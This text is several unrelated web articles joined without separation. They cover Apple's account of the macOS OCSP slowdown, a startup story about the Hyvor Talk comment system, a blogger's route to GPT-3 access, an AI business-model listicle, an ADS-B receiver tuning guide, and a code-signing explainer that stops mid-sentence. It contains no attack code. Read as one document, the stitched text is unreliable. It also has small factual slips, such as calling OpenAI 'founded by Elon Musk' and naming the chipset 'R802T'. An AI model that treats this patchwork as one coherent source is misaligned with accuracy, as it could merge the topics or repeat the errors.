<p>The industry-standard online certificate status protocol (OCSP) is used by macOS to verify that the Developer ID code signing certificate issued to an app developer has not been revoked. This OCSP request does not include the Apple ID of the user, or reveal a device or app being launched.</p>
<p>Apple says since OCSP is used to check other certificates, including those used to encrypted web connections, these requests happen over unencrypted HTTP, as normal throughout the industry.</p>
<p>HTTP is used to prevent&nbsp;situations where verifying the validity of the certificate that secures the connection to an OCSP server would potentially depend on the result of a request to that same&nbsp;OCSP server, creating a loop that would make it impossible to resolve the request, according to Apple.</p>
<p>Apple says on macOS Catalina and later, by default, all apps running are notarized by the company to note they have been checked by Apple for known malicious software. When an app launches, macOS will check to verify that the app has not been labeled as malicious by Apple since it was first notarized. These checks happen over an encrypted connection—and are resilient to server failures. Which is what happened the other day and users saw their apps hang and take forever to launch.</p>
<p>What caused the OCSP server problem? Apple says it was due to a server-side misconfiguration that specifically interfered with macOS being able to cache OCSP responses for Developer ID. This configuration error, along with an unrelated content delivery network (CDN) misconfiguration, is what caused the slow performance for apps to launch.</p>
<p>Apple explained to <em>iPhone in Canada</em> it has already fixed this performance issue through a server-side update, that will now allow macOS to cache Developer ID OCSP checks for a longer period. macOS users do not need to do anything to benefit from this Apple update.</p>
<p>App notarization checks are used to verify that apps being launched in macOS have not been found to be malicious by Apple, since they were first notarized. Apple says these checks take place over an encrypted connection and are immune to server failures. Notarization checks were not affected by the server-side issue that caused OCSP requests to fail.</p>

<p>In 2018, I was learning web development and wrote my journey on my blog. I wanted to add comments to that blog and the most popular option was Disqus. I went with it, and Disqus started showing ads on my website after a while. That was not nice. I didn’t like Disqus’s UI either. And, Disqus has <a href="https://talk.hyvor.com/blog/move-away-from-disqus/">serious privacy concerns</a>. So, I coded my own commenting system. I didn’t have any plans to make it a SaaS product – I just needed commenting functionality for my blog. However, if someone wanted, I added an option to log in and use the system on their website.</p>
<p>I bought the <strong>hyvor.com</strong> domain a long time ago, having the dream of creating a successful brand called “Hyvor”. Even I wasn’t sure this side project was the way to build this brand, I published it as a product of Hyvor, naming it Hyvor Talk. Until 2020, it was free and a few bloggers used it. I published it on a few startup directories and got a little traction. But, the product wasn’t attractive at this time. And, it was just a side project with no intention of making money from it.</p>
<h2>Working Full-time and Adding Subscriptions</h2>
<p>In January this year (2020), I started working full-time on Hyvor Talk with my partner, Ishini. Both of us were just 19 years old, finished school, no much work to do. So, we could completely focus on Hyvor Talk. We added some cool features and created a better landing page.</p>
<p>The next thing was adding subscriptions. Here we stuck. Paypal and Stripe don’t support Sri Lanka. One option was registering the business in the US and using Stripe, which was expensive for us. However, thankfully, we found Paddle.com, which is built only for SaaS (We won’t be here without Paddle!)</p>
<p>Then, we added two paid plans: $40/month and $1000/month (Yes, not flexible). We worked so hard on the product (almost 16-18 hours a day) in January, sharing on forums, spamming on Facebook Groups. Nothing worked. At this time, we had zero knowledge of marketing. So, we struggled.</p>
<h2>It’s March, 1000s of Hours of Work, 0 Paid Users</h2>
<p>It was March. We’ve worked endless hours of work. No paid customers. Only a few free plan users, who just tested the system and went away. Maybe we were doing something wrong? Maybe the product wasn’t so good? Maybe there wasn’t a market for a new commenting platform? So many things came up to our minds. At this time, I was freelancing to make money and spending that for hosting, paid promotions, etc.</p>
<p>We made $0 in two months. In the first week of March, I asked Ishini “should we continue this?”. We were like yes, no, yes, no, yes, no… However, we decided not to give up because we believed in ourselves and our product. We made more features. Changed landing pages, tried different acquisition channels, and did everything we could.</p>
<h2>The First Paying User</h2>
<p>March 23rd was the day! We got our first paid customer who subscribed to our $40/month plan. We celebrated this like we just won the whole world. Now, we spend $5 for hosting and earn $40 per month. Yay, profitable (kind of). This made us feel very happy. Yes, $35 cannot do much, but if you are a bootstrapper, you know how it feels.</p>
<h2>Changing Pricing &amp; Growth</h2>
<p>We also made pricing more flexible in April. We added two types of plans called Premium (from $5/month) and Business (from $35/month). We got a few free plan users and paid customers. Still, we were on the edge of the sword. However, we started to see a growth in organic traffic to our articles on this blog.</p>
<p>Then, in May, our first employee, Rohitha, joined our team for content marketing. This had a huge impact on our growth. I could focus on the development part, Ishini did the designing and graphics, Rohitha worked on content writing, which is a great funnel for a small team like us.</p>
<p>At this moment, most of the new users come through Google. Besides that, we also see a lot of users directly coming to our website, starting the trial, and subscribing to paid plans on the first day of trial. Even I’m not sure, I think this is “word of mouth”.</p>
<h2>Removing the Free Plan</h2>
<p>When September started, we had 53 paying customers. At this point, we were fully profitable. After a lot of discussions, we made the decision to remove the free plan for some reasons. Since the start, we thought we would remove the free plan someday. However, it happened earlier than we thought because our free plan user base started to grow faster, and converting them to paid is a huge hassle (I’ll explain why it’s hard to have a free plan for a pageviews-based pricing model in a future post).</p>
<p>We removed the free plan on September 5th. And, our growth since then is tremendous. We had 56 customers then (from March to September, 6 months). We almost doubled the number in just 2 months.</p>

<h2>What to take from this story?</h2>
<p>If you are reading this article, probably you are an <a href="https://www.indiehackers.com/start">indiehacker</a>, or willing to be one someday. Here are some things I believe as a bootstrapper, which might be helpful for you.</p>
<ul><li><strong>Learn but don’t imitate</strong>: Read other’s stories. But, do not imitate them! Create your own story. For example, product X shared their story to 1m ARR in 2 years. You don’t have to do the same thing. Do it at your own pace in your own way. Try everything and find the best way that fits you. Most importantly, don’t give up.</li><li><strong>Make decisions carefully</strong>: I turned down AppSumo promotion, multiple investing requests just to be fully independent. Also, removing the free plan (a very hard decision) accelerated our growth. You don’t have to do the same. Do what you think is correct. Don’t be afraid to make hard decisions in the first couple of months.</li><li><strong>Improve your product</strong>: Get feedback from your customers and improve the product. For example, we have a great discord community of ~100 website owners who give us feedback to improve our product. Our best features were suggested by these users.</li></ul>
<p>Finally, I want to thank each of our customers for believing in us throughout this journey. Leave any questions below in the comments section.</p>
<p>PS: We do not disclose our MRR/ARR.</p>

			<p>Do you remember the Guardian article written by a robot? It was the work of the new and powerful GPT-3.</p>
<h2><strong>What is GPT-3?</strong></h2>
<p>GPT-3 is a text generation technology developed by OpenAI, a well-known artificial intelligence research company founded by Elon Musk.</p>
<p>At the moment, not everyone can get access to it. OpenAI wants to ensure that no one misuses it. This is why it is available to only selected people.</p>
<p>As an SEO professional, I was excited to use GPT-3 in ways that can help the people in the SEO industry.</p>
<p>Before wasting any time, I decided to do whatever it takes to get my hands on GPT-3.</p>
<h2>Here is how I got access to GPT-3:</h2>
<h3><strong>OpenAI API waitlist form</strong></h3>
<p>I first applied for GPT-3 API through OpenAI’s official Waitlist form. On the form, I mentioned the intended purpose and the details about my project.</p>
<p><img src="https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access.jpg" alt="OpenAI API Access - How I Got Access to GPT-3 and How Can You too!" width="1868" height="851" srcset="https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access.jpg 1868w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-300x137.jpg 300w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-1024x467.jpg 1024w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-150x68.jpg 150w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-768x350.jpg 768w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-500x228.jpg 500w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-800x364.jpg 800w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-1280x583.jpg 1280w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-1536x700.jpg 1536w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-848x386.jpg 848w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-1140x519.jpg 1140w, https://digitallyup.com.au/wp-content/uploads/2020/11/OpenAI-API-Access-1170x533.jpg 1170w" sizes="(max-width: 1868px) 100vw, 1868px" title="How I Got Access to GPT-3 and How Can You too!"></p>
<p>After applying, I anxiously waited to get a response. Two days had passed, but no response came.</p>
<p>I sent a follow-up email. Still, no reply… A week had gone, though, no progress was made.</p>
<h3><strong>Go the extra mile and show that you are serious</strong></h3>
<p>My frustration was growing. But I thought there must be something missing. So, I thought of exploring Twitter and seeing if any users got access to it.</p>
<p>There, I read the tweets of a few people who were able to get GPT-3 access. Their advice was to ‘go the extra mile’ so that the OpenAI engineer or the Chairman can get your attention, and they can see that you are serious.</p>
<p>So, this is what I did:</p>
<ul><li>Purchased a fancy domain for my intended project.</li>
<li>Designed a demo landing page along with a small animation – just to give a glimpse of what’s in store. And how my idea can benefit people.</li>
<li>Tweeted about my project with a video and tagged OpenAI chairman. After only 10 minutes, I received a reply from him asking me for my email. And boom, I got access.</li>
</ul><blockquote>
<p dir="ltr" lang="en"><a href="https://twitter.com/gdb?ref_src=twsrc%5Etfw" rel="nofollow">@gdb</a> Hi Greg. My <a href="https://t.co/iibYGMW3Xv" rel="nofollow">https://t.co/iibYGMW3Xv</a> project is still awaiting GPT-3 access.</p>
<p>Is there a way that you maybe able to expedite the process? <a href="https://t.co/J2NeDvbgHF" rel="nofollow">pic.twitter.com/J2NeDvbgHF</a></p>
<p>— Ashar Jamil (@Asharjamil) <a href="https://twitter.com/Asharjamil/status/1317163403681693699?ref_src=twsrc%5Etfw" rel="nofollow">October 16, 2020</a>
</p></blockquote>

<p>It took some effort, but it was worth it. Filling the application form with beneficial intended purposes will not be enough. You will have to make an extra effort and show that you mean business.</p>
<p>If you are struggling to get access to GPT-3, my advice will be to showcase your project demo; and invest a little in your project so that it looks professional. It will increase your chances of getting access.</p>
<p>The bottom line is that you have to work for it.</p>
<p>Good luck!</p>

<h2>How AI Engineers Can Build Business-Centric Models</h2>
<p><img src="https://www.artiba.org/Content/Images/business-centric-models.jpg" title=""></p>

<p><i><b>Can AI engineers produce a model built to succeed? Is there a fine line between AI research ambitions and business goals?</b></i></p><p>We will see this and more here.</p><p>In pursuit of successes like Alibaba and Amazon, the business fraternity the world over is enraptured for AI models. AI is not the buzzword these days, it is THE word!</p><p>But, here is the flip side.</p><p>Many AI models fail to create a meaningful impact and stop at pilot projects or a single business process. Two common misalignments are at the root of this loss:</p><ul><li><p>AI model disconnected with business needs</p></li><li><p>Business leaders’ expectation of AI being a plug-and-play solution with immediate results</p></li></ul><p>AI models are costly, and their failure results in lost motivation and interest in future projects. So, it is both the privilege and the prerogative of AI engineers to lay all stones to success for their project.</p><p>Champions in <a target="_blank" href="https://www.artiba.org/blog/ai-led-manufacturing-in-industry-4">Artificial Intelligence</a> have laid a common success route.  We’ve covered it here. Check it out. It can save the day for you.</p><h4>Types of AI Business models</h4><p>A business-aligned AI model is:</p><ul><li><p>Cost-effective</p></li><li><p>Quick</p></li><li><p>Useful</p></li></ul><p>Three types of AI business models are common:</p><h4>Bolt-on:</h4><p> In their deployments, these models resemble a product from a SaaS company. Bolt-on models build on top of other systems of record, like an enterprise resource planning (ERP) system or a customer relationship management (CRM) product. AI administers data flowing through these systems, feeding business improvements over time.</p><p> Use cases: Chorus AI, Gong, and Solvy</p><h4>Process enhancements:</h4><p>They turbocharge the performance of existing processes. These models are tricky to implement, and their sales cycles are long, but if successful they are incredibly successful in upselling. Their ROI can be unlimited.</p><p>Use cases: Ayasdi, IBM Watson, and H2O.AI</p><h4>Standalone models:</h4><p>These models work on their own with little human intervention. Hardware is costly and central to these models. They sell subscription packages to organizations.</p><p>Use cases: Kespry</p><h4> 6 Steps to Create the Best Performing AI Models</h4><p> The best way to approach an AI model is to minimize the process-associated risks. It can be done by following six steps.</p><p><img src="https://www.artiba.org/Content/Images/best-performing-ai-models.jpg" title=""></p><h4>#1. Plan</h4><p> Many <a target="_blank" href="https://www.artiba.org/blog/ai-chatbots-business-applications-for-ai-engineers">AI engineers</a> bypass this stage and jump straight to execution. Any disconnect at this stage means upping the chances of failure manifold.</p><p>  Before going forward with a concept, the AI engineer must identify the business need.</p><p> To do so, analyze recent customer journeys like discovery, sales, presales, and customer service. Understand the experience of your customers with your brand. Look for pain points. Ask who are going to be the end-users of your solution and interact with them.</p><p>  “Your business results depend on your brand’s ability to retain and add customers.” – Olive Huang, Research Director at Gartner</p><p> Zero in on specific business problems and find out how your model can solve those problems. Once you build an algorithm to solve a specific business problem, it can be easily adapted for use in other areas.</p><h4>#2. Validate:</h4><p>  Read ongoing research and successful use cases extensively. See if the problem has already been addressed by some other model. The annual Conference on Neural Information Processing Systems (NeurIPS) gives information on the latest developments.</p><p> Datasets could be another source of ideas. Look for open and your own datasets. Think if you need to remake your competitor’s processes, how would you make them? What new functions would you include?</p><h4>#3. Refine</h4><p>Once you pick an idea, develop it in these four steps:</p><p><b>Start simple:</b>Begin with mundane, manual tasks that can be done with little human thought.</p><p><b>Validate risks:</b> Evaluate the risk if the project fails.</p><p><b>Build a proof of concept:</b> Establish the feasibility of the project.</p><p><b>Take feedback from the user group:</b> Are they excited about the solution? If not, try to educate them. Your user groups are integral to the success of your model.</p><h4>#4. Implement</h4><p>Distribute the risks by working on multiple ideas at one time. Treat the failure cost as sunk investments. Invest more in less-risky ideas and stop the failing ones.</p><p> Take care of Time to Value and the Return on Investment. By doing so, you can keep the business stakeholders invested in your projects.</p><p>Don’t build everything from scratch. Consider using pre-made blocks. This will reduce the time to value.</p><p>Update yourself with the latest tools as they keep evolving.</p><p><img src="https://www.artiba.org/Content/Images/tool-use.jpg" title=""></p><h4>#5. Establish Controls:</h4><p>Fix control points in your research projects:</p><ul><li><p>Use clean data</p></li><li><p>Establish the success criteria as to when to stop because research can easily turn into an endless process.</p></li></ul><h4>#6. Educate as you Move Forward:</h4><p>Businesses look for 100 percent results; tech research doesn’t promise anything. Educate your users as you move ahead with your project.</p><p>To ensure the success of an AI model, both AI engineers and business stakeholders need to see the project from a similar vantage point.  Have you established one?</p>

<p>Automatic dependent surveillance–broadcast&nbsp;(ADS-B) technology enables aircraft to&nbsp;determine their position via satellite and periodically broadcast this location information. An ADS-B receiver system can be used to decode this broadcast signal to track airplanes. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system-1024x576.png" alt="" width="473" height="266" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-system.png 1600w" sizes="(max-width: 473px) 100vw, 473px"><figcaption>The ADS-B System</figcaption></figure></div>



<p>Now let’s take a look at the various components of an ADS-B station, why they matter, and how to make improvements. </p>



<h2><strong>ADS-B Receiver</strong></h2>



<p>In <a href="https://www.onesdr.com/2020/10/21/the-best-ads-b-receiver-for-2020-2021/">this article we previously discussed the different ADS-B receivers</a> on the market today. Systems like the one from <a href="https://amzn.to/36E08h1">Garmin</a> are completely closed and fully integrated and there’s not much opportunity to understand how they work or improve them. The best you can do is use them as per the manufacturer’s recommendation and that should result in the best performance for this product.</p>







<p>On the other hand, there’s plenty of opportunity to learn from open systems based on  either the <a href="https://amzn.to/3f4pJUk">FlightAware</a> or the <a href="https://amzn.to/3kzQa59">Stratux ADS-B receivers</a>. </p>







<p>Both these systems use <a href="https://amzn.to/3f0RHjH">the RTL-SDR</a> as foundational building blocks. There’s a wealth of information online on the internal architecture and various experiments conducted on these products to understand their specifications, performance and how best to use them. There’s also a large online community to learn from and contribute to. </p>



<h2>How Much ADS-B Signal Do You Really Need?</h2>



<p>In general when a receiver processes signals, there is a range of optimal signal level over which it performs best. Anything lower will result in performance degradation – in other words, you will see fewer airplanes. Anything greater will have the same effect. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/ADS-B-SIGNAL-LEVELS-1024x677.png" alt="" width="495" height="327" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/ADS-B-SIGNAL-LEVELS-1024x677.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/ADS-B-SIGNAL-LEVELS-300x198.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/ADS-B-SIGNAL-LEVELS-768x508.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/ADS-B-SIGNAL-LEVELS.png 1202w" sizes="(max-width: 495px) 100vw, 495px"><figcaption>Different ADS-B Signal Ranges </figcaption></figure></div>



<p>At the very extreme, signal levels higher than a certain level will damage the ADS-B receiver. The trick then is to optimize the signal level such that you can get to within the sweet spot of the ADS-B receiver. </p>



<h2><strong>A Note on Measuring Signals </strong></h2>



<p>In general, it is very difficult to predict actual wireless signal strengths received without making a measurement. Typically a spectrum analyzer is used to make signal measurements at any given frequency. However, not everyone can afford a spectrum analyzer or has access to one. Fortunately it is possible to use an application like SDR# with your receiver to determine how strong or weak various received signals actually are and the impact they might be having on performance.</p>



<p>Here is an example of signal measurement with <a href="https://amzn.to/3f0RHjH">the RTL-SDR</a> as viewed in SDR#. The two views shown are the FFT view and the waterfall or spectrogram below it.</p>

<p>As you experiment with different antennas and other components below, tune across the frequency range of <a href="https://amzn.to/3f0RHjH">the RTL-SDR</a> to check out various signals and their strengths in the waterfall view. This will give you an idea of how your changes impact performance. It will for instance tell you approximately how much gain you need to add up front. It will also tell you if you actually need any amplification at all. In general avoid doing anything that increases the <strong><span>RED</span></strong> levels as these are very strong signals. </p>



<p>Now let’s take a look at the various parts of the ADS-B system and how they impact performance.</p>



<h2>Antennas</h2>



<p>The antenna is at the very front-end of your ADS-B system. You will need an effective <a href="https://amzn.to/3cyPXNr">antenna for ADS-B</a> as it is key to good signal reception. As is often said, garbage in, garbage out. If you use a lousy antenna, a good receiver isn’t going to compensate for it. You can read our complete <a href="https://www.onesdr.com/2020/04/19/best-antennas-for-ads-b-reception/">review of ADS-B antennas</a>. The best antenna requires some effort for installation and optimization but it’s well worth the time spent. </p>



<h2>RF Cables</h2>



<p>If you’re looking to mount your antenna on your rooftop or on a tower for better reception, you will need to take the length of the RF cable from the antenna to your ADS-B receiver into consideration. Why is that?</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop-1024x576.png" alt="" width="553" height="311" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/Installing-an-antenna-on-rooftop.png 1600w" sizes="(max-width: 553px) 100vw, 553px"><figcaption>Installing an Antenna on your Rooftop</figcaption></figure></div>



<p>As the frequency of the signal increases, so do the signal losses or attenuation due to any given length of cable. For instance, if you were to use <a href="https://amzn.to/36DJJcj">LMR-400 cable</a>, the loss at 30 MHz is only 0.7 dB for every 100 ft of cable. For the same length of cable, the loss at 1090 MHz is around 4 dB. This signal loss directly impacts the sensitivity of the system by 4 dB and therefore reduces the range of your ADS-B receiver by more than half relative to if you were to use a very short length of cable. That is quite significant.</p>



<h2>Amplifiers</h2>



<p>Fortunately there is a way to compensate for this degradation in sensitivity due to cable loss. It involves the use of a low noise amplifier (LNA). In general, any LNA with sufficiently low noise figure (typically less than 1 dB) and the required amount of gain can be used. </p>



<p>So the first question is – what is the required gain? </p>



<p>The answer depends on several factors some of which are:</p>



<ul><li>Amount of cable loss at 1090 MHz</li><li>Other RF signals are present in your environment – in particular strong ones</li><li>The dynamic and operating range of your ADS-B receiver</li></ul>



<p>As discussed, cable loss can be overcome with the use of an LNA. However, an LNA will amplify everything within its range of operation. It will amplify AM, FM and other signals. Consider a situation where an FM signal is stronger than the ADS-B signal of interest. The amplified signal will saturate the receiver if it exceeds the dynamic range. The signal will also possibly damage the receiver if you’re operating at signal levels that exceed the range of the receiver. The receiver will not be able to process the ADS-B signal of interest in either case.</p>



<figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1-1024x576.png" alt="Block diagram showing ADS-B signal amplified" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-1.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Amplifying an ADS-B signal</figcaption></figure>



<p>A solution to this problem is to use a Filtered LNA. This is an LNA with a filter integrated along with it as shown in the picture below.</p>



<figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2-1024x576.png" alt="Filtered LNA for ADS-B" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/LNA-2.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Filtered Low Noise Amplifier for ADS-B</figcaption></figure>



<p>The LNA is usually the first component and it is followed by a filter specific to the band of interest – in this case 1090 MHz for ADS-B. This product will reject all signals outside the ADS-B frequency range. For instance it will reject strong FM signals, 4G signals from cellular base stations, signals at 2.4 GHz from your Wi-Fi access point and more. </p>



<p>Here are a couple of ADS-B filtered LNAs that will work depending on your setup.</p>







<p>Use <a href="https://gpio.com/collections/filtered-low-noise-amplifier/products/ads-b-filtered-dual-low-noise-amplifier-lna-with-30-db-gain">this Filtered LNA with 30 dB gain</a> if you have a very long cable run and need to compensate for significant signal loss. Using the calculation for LMR400 above, this Filtered LNA can compensate for 700 ft of cable loss. </p>



<p>Use <a href="https://gpio.com/collections/filtered-low-noise-amplifier/products/ads-b-filtered-low-noise-amplifier-lna-with-15-db-gain">this Filtered LNA that provides 15 dB gain</a>, if you have a shorter cable run. </p>



<h3><strong>How to Install an LNA</strong></h3>



<p>It is best to place the LNA very close to the antenna. This will help minimize the noise figure and improve the sensitivity of your ADS-B receiver system. Since it’s difficult to get a power source or supply at the top of an antenna, <a href="https://www.onesdr.com/2020/01/19/what-is-a-bias-tee/">a bias tee system</a> can be used. A bias tee at the receiver is used to send the DC voltage up to the LNA over the RF cable connecting the two. At the LNA there is a reciprocal bias tee that splits the DC and RF signals. The DC is used to power the LNA. The block diagram below shows a situation where the SDR has a built-in bias tee. This is indeed the case with <a href="https://amzn.to/3f0RHjH">the RTL-SDR</a>.</p>



<figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/03/bias-tee-modules-1-1024x576.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/03/bias-tee-modules-1-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/03/bias-tee-modules-1-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/03/bias-tee-modules-1-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/03/bias-tee-modules-1.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Use a Bias Tee to Power a Remote LNA</figcaption></figure>



<p>Sometimes when an LNA is connected the results look like in the following picture – amazing results with a tripling of the number of planes observed!</p>



<div><figure><img loading="lazy" width="940" height="529" src="https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-improvement.jpg" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-improvement.jpg 940w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-improvement-300x169.jpg 300w, https://www.onesdr.com/wp-content/uploads/2020/11/ads-b-improvement-768x432.jpg 768w" sizes="(max-width: 940px) 100vw, 940px"><figcaption>Improvement in Number of Planes Tracked</figcaption></figure></div>



<p>At other times, the addition of an LNA degrades performance and you will not be able to see any airplanes. Why does this happen? Let’s assume that your LNA is connected properly with the RF input end connected to the antenna and that it is powered correctly. There are then two possibilities:</p>



<ul><li><strong>Too much cable loss</strong> and the amount of LNA gain cannot help overcome this degradation. In this situation more gain is required and you can simply add another LNA. Remember to place the first LNA as close to the antenna as possible so as to minimize noise figure. Remember also to check signal levels so you can adjust the amplitude to be within the optimal range. </li><li><strong>Too much gain </strong>and you are likely saturating your receiver with strong signals. Note that even when using a filtered LNA, if the FM signals in your area are very strong, the out-of-band attenuation due to the filter might not be adequate to prevent receiver saturation. Once again you can check what’s going on with the spectrum analyzer view in SDR#. </li></ul>



<h3><strong>How to Optimize the Signal Levels into the RTL-SDR</strong></h3>



<p>There are three methods by which you can optimize signal levels going into the RTL-SDR after the addition of a Filtered LNA.</p>



<p>In the event that you have strong out-of-band signals, they should be attenuated to a reasonable level. The easiest way to do this is by adding an additional <a href="https://www.tindie.com/products/gpio/ads-b-bandpass-filter-band-pass-1090-mhz-ads-b/">ADS-B bandpass filter</a> after the Filtered LNA.</p>



<p>Another way to optimize gain is to reduce the signal level across the band with an attenuator. Connect <a href="https://amzn.to/2K4a4IY">an inline fixed attenuator</a> to the output of the LNA. You can experiment with different values such as 30 dB, 20 dB, etc. until you start seeing output by way of planes. </p>







<p>The third method is to adjust the gain in the Flightaware stick digitally. The <a href="https://amzn.to/3f4pJUk">FlightAware</a> stick is essentially an <a href="https://amzn.to/3f0RHjH">RTL-SDR</a> and utilizes an R802T chipset. Below is a block diagram of the R802T.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/R820T-block-1024x689.png" alt="" width="540" height="363" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/R820T-block-1024x689.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/R820T-block-300x202.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/R820T-block-768x517.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/R820T-block.png 1498w" sizes="(max-width: 540px) 100vw, 540px"><figcaption>R802T Architecture</figcaption></figure></div>



<p>As you can see the user has the ability to modify the Variable Gain Amplifier (VGA). The range over which this can be varied is nearly 50 dB. The <a href="https://amzn.to/3f4pJUk">FlightAware</a> powers up with maximum amplification in the system. So you essentially have to adjust it to a point where you get the best reception. <a href="https://discussions.flightaware.com/t/for-beginners-how-to-set-change-gain/30201">Here are instructions on how to modify the gain</a>. </p>



<p>Many experiments have been conducted and reported on the <a href="https://amzn.to/3f4pJUk">FlightAware</a> discussion site. <a rel="noreferrer noopener" href="https://discussions.flightaware.com/t/gain-adjustment/18376/7" target="_blank">Here is one such discussion</a>. In the plot below, user BartJr has reported an improvement in reception with increase in amplification.</p>



<div><figure><img loading="lazy" width="777" height="392" src="https://www.onesdr.com/wp-content/uploads/2020/11/rtl-vga-inc.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/rtl-vga-inc.png 777w, https://www.onesdr.com/wp-content/uploads/2020/11/rtl-vga-inc-300x151.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/rtl-vga-inc-768x387.png 768w" sizes="(max-width: 777px) 100vw, 777px"><figcaption>Reception Varies with VGA Gain</figcaption></figure></div>

  <div itemprop="articleBody">
    <p>Two days ago, macOS users experienced worrying hangs when opening applications not downloaded from the Mac App Store. Many users suspected hardware issues with their devices, but as they took to social media, they found it was a widespread problem. And it was no coincidence that it was happening so soon after the launch of macOS “Big Sur”.</p>

<p>Eventually, <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489">a tweet by Jeff Johnson</a> pinpointed the underlying issue. Apple’s “OCSP Responder” service was overloaded, therefore macOS was unable to verify app developers’ cryptographic certificates.</p>

<p><img src="https://blog.cryptohack.org/assets/images/apple-tweet.png?style=centerme" alt="Jeff Johnson's tweet"></p>

<p>But why are OCSP Responders in the critical path of apps launching? This post will briefly discuss code signing, how Online Certificate Status Protocol (OCSP) works, why it’s deeply flawed, and what are some better alternatives. Unlike other posts on this incident, I want to emphasise the practical crypto aspects (at a high level) and offer a balanced perspective.</p>

<h3 id="code-signing">Code Signing</h3>

<p>On their developer portal, Apple explain <a href="https://developer.apple.com/support/code-signing/">the purpose of code signing</a>:</p>

<blockquote>
  <p>Code signing your app assures users that it is from a known source and the app hasn’t been modified since it was last signed. Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a certificate issued by Apple.</p>
</blockquote>

<p>In other words, if developers want their apps to be trusted on macOS, they must sign them using their own certificate keypair. Keychain is used to generate a unique “Developer ID” certificate, which includes a private key for the developer to use, and a public key for distribution. After Apple have signed the Developer ID certificate, the developer can use the private key to produce cryptographic signatures on their apps as part of their release process.</p>

<p>When you run an app, its signature is verified against the public key of the developer’s certificate. Then, the certificate itself is verified, by checking that it hasn’t expired yet (certificates are typically valid for 1 year), and that it’s ultimately signed by Apple’s root certificate. There may also be intermediate certificates as part of the chain up to the root certificate. A “chain of trust” has been created, because the developer ID certificate signed an app, an intermediate certificate signed the developer ID certificate, and Apple’s root certificate signed the intermediate certificate. Any Apple device can verify this chain of trust and therefore approve an app to run.</p>

<p>This is similar to the TLS Public Key Infrastructure used on the internet. But it’s also fundamentally different since Apple has total control over its own chain of trust. Other certificate authorities are not allowed to issue valid certificates for code signing as all certificates must chain back up to Apple.</p>

<p>If the verification process wasn’t successful, then users will see a scary dialogue which is difficult to bypass:</p>

